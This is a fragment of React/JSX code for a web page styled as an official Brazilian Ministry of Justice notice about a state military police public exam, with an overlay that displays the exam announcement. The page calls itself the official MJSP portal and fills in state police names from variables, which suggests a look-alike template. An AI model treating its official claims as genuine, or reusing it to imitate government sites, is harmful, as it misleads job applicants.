              <><strong>Exame de Saúde</strong> — avaliação médica e odontológica conforme padrões da corporação.</>,
              <><strong>Curso de Formação</strong> — etapa final, realizada na Academia{estadoPM ? ` da ${estadoPM.sigla}` : ' de Polícia Militar'}. Duração média de 6 a 12 meses. Salário e benefícios pagos integralmente durante a formação.</>,
            ] as React.ReactNode[]).map((item, i) => (
              <li key={i} style={{ display: 'flex', gap: '14px', padding: '7px 0', borderBottom: '1px solid #ebebeb', lineHeight: '1.6' }}>
                <span style={{ minWidth: '28px', fontWeight: 700, color: '#555', fontSize: '0.8rem', paddingTop: '2px', flexShrink: 0 }}>{i + 1}.</span>
                <span>{item}</span>
              </li>
            ))}
          </ol>
          <p style={{ fontSize: '0.78rem', color: '#777', borderTop: '1px solid #e5e7eb', paddingTop: '8px', marginBottom: '32px' }}>
            {estadoPM ? `${estadoPM.nomeCompleto} — Comando-Geral / MJSP, 2026` : 'Secretaria Nacional de Segurança Pública — SENASP / MJSP, 2026'}
          </p>

          <div className="mb-8">
            <button
              onClick={abrirEdital}
              className="inline-flex items-center gap-2 text-sm font-medium transition-colors duration-200 hover:underline"
              style={{ color: '#2670e8' }}
            >
              <i className="fas fa-file-alt"></i>
              Ler edital completo
              <i className="fas fa-chevron-right text-xs"></i>
            </button>
          </div>

          <h2 className="text-xl font-bold mt-8 mb-4" style={{ color: '#1351b4' }}>Informações Adicionais</h2>

          <p className="text-lg text-[#555555] leading-relaxed mb-8">
            Dúvidas sobre o concurso podem ser esclarecidas pela Central de Atendimento do Ministério da Justiça e Segurança Pública pelo telefone <strong>0800 978 0001</strong>, de segunda a sexta-feira, das 8h às 18h, ou pelo canal <strong>Disque 100</strong> para informações de direitos humanos e segurança pública.
          </p>
        </article>

        <footer className="mt-12 pt-6 border-t border-gray-200">
          <div className="text-xs text-gray-600">
            <p className="font-semibold text-[#333] mb-1">
              Assessoria de Comunicação — {estadoPM ? `${estadoPM.sigla} / MJSP` : 'MJSP / Polícia Militar'}
            </p>
            <p>Ministério da Justiça e Segurança Pública — {editalSlug}</p>
            <p className="mt-2 text-xs text-gray-500">
              Esta matéria segue os padrões jornalísticos institucionais do {editalSlug} — Concurso Público{estadoPM ? ` da ${estadoPM.nomeCompleto}` : ' Nacional'}
            </p>
          </div>
        </footer>
      </main>
      <ExercitoFooter />
      {showEdital && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: "#f4f6f8",
            zIndex: 99999,
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
          }}
        >
          <div style={{ backgroundColor: "#071D41", height: "4px", width: "100%", flexShrink: 0 }} />

          <div style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0", padding: "0 20px", flexShrink: 0 }}>
            <div style={{ maxWidth: "960px", margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", height: "52px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                <img src={logoHeader} alt={`${editalSlug} — Concurso Público`} style={{ height: "32px", objectFit: "contain" }} />
              </div>
              <button
                onClick={fecharEdital}
                style={{
                  background: "none",
                  border: "1px solid #ccc",
                  borderRadius: "50%",
                  width: "32px",
                  height: "32px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  cursor: "pointer",
                  color: "#555",
                  fontSize: "15px",
                  fontFamily: "Arial, sans-serif",
                  lineHeight: 1,
                  transition: "background 0.15s",
                }}
                onMouseEnter={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                onMouseLeave={(e) => (e.currentTarget.style.background = "none")}
              >
                ✕
              </button>
            </div>
          </div>

          <div style={{ flex: 1, overflowY: "auto", WebkitOverflowScrolling: "touch" }}>
            <div style={{ maxWidth: "720px", margin: "0 auto", padding: "32px 24px 60px", backgroundColor: "#fff", minHeight: "100%", boxShadow: "0 0 20px rgba(0,0,0,0.04)" }}>
              <div style={{ textAlign: "center", marginBottom: "28px", paddingBottom: "20px", borderBottom: "1px solid #e8e8e8" }}>
                <img
                  src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png"
                  alt="Brasão da República"
                  style={{ height: "48px", margin: "0 auto 10px", display: "block", objectFit: "contain" }}
                />
                <p style={{ fontSize: "10px", color: "#888", margin: "0 0 2px", fontFamily: "'Rawline', sans-serif", letterSpacing: "1.5px", textTransform: "uppercase" }}>
                  MJSP — Ministério da Justiça e Segurança Pública
                </p>
                <p style={{ fontSize: "9px", color: "#aaa", margin: "0 0 14px", fontFamily: "'Rawline', sans-serif" }}>
                  {estadoPM ? estadoPM.nomeCompleto : 'Secretaria Nacional de Segurança Pública — SENASP'}
                </p>
                <h1 style={{ fontSize: "17px", fontWeight: 700, color: "#1a1a1a", margin: "0 0 4px", fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.3px" }}>
                  {editalSlug.toUpperCase()}
                </h1>
                <p style={{ fontSize: "12px", color: "#666", margin: 0, fontStyle: "italic", fontFamily: "'Times New Roman', Georgia, serif" }}>
                  Concurso Público — {estadoPM ? estadoPM.nomeCompleto : 'Polícias Militares Estaduais / MJSP'}
                </p>
              </div>

              {editalConteudo.map((paragrafo, i) => {
                const isCapitulo = paragrafo.startsWith("CAPÍTULO") || paragrafo.startsWith("EDITAL");
                const isArtigo = paragrafo.startsWith("Art.");
                const isParagrafo = paragrafo.startsWith("§");
                return (
                  <p
                    key={i}
                    style={{
                      fontSize: isCapitulo ? "13px" : "14px",
                      color: isCapitulo ? "#155bcb" : "#333",
                      textAlign: isCapitulo ? "center" : "justify",
                      marginBottom: isCapitulo ? "18px" : "14px",
                      marginTop: isCapitulo ? "28px" : "0",
                      lineHeight: 1.8,
                      fontFamily: "'Times New Roman', Georgia, serif",
                      fontWeight: isCapitulo ? 700 : 400,
                      textTransform: isCapitulo ? "uppercase" : "none",
                      letterSpacing: isCapitulo ? "0.5px" : "normal",
                      textIndent: isArtigo || isParagrafo ? "0" : isCapitulo ? "0" : "2em",
                      paddingLeft: isParagrafo ? "1.5em" : "0",
                    }}
                  >
                    {paragrafo}
                  </p>
                );
              })}

              <div style={{ marginTop: "40px", borderTop: "1px solid #e8e8e8", paddingTop: "16px", textAlign: "center" }}>
                <p style={{ fontSize: "10px", color: "#aaa", fontFamily: "'Rawline', sans-serif", margin: "0 0 2px" }}>
                  Documento de acesso público — Portal Oficial do MJSP{estadoPM ? ` / ${estadoPM.sigla}` : ' / Secretaria Nacional de Segurança Pública'}
                </p>
                <p style={{ fontSize: "9px", color: "#bbb", fontFamily: "'Rawline', sans-serif", margin: 0 }}>
                  SERPRO — Serviço Federal de Processamento de Dados
                </p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
